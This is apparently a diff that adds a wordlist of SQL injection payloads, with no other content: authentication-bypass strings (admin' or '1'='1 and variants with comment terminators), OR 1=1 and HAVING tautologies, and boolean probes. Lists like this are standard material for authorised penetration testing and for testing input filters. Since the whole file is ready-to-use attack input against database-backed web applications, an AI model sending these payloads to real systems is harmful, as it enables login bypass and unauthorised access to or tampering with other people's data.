@@ -1,0 +1,43 @@
+'--' / "--"
+admin' #
+admin' --
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin'or 1=1 or ''='
+HAVING 1=0
+HAVING 1=0#
+HAVING 1=0--
+HAVING 1=1
+HAVING 1=1#
+HAVING 1=1-- 
+" or ""-"
+' or ''-'
+OR 1=0
+OR 1=0#
+OR 1=0-- 
+or 1=1
+or 1=1#
+or 1=1--
+or 1=1/*
+OR 1=1
+OR 1=1#
+OR 1=1-- 
+OR 3409=3409 AND ('pytW' LIKE 'pytW
+OR 3409=3409 AND ('pytW' LIKE 'pytY
+" or true--
+' or true--
+OR x=x
+OR x=x#
+OR x=x-- 
+OR x=y
+OR x=y#
+OR x=y--
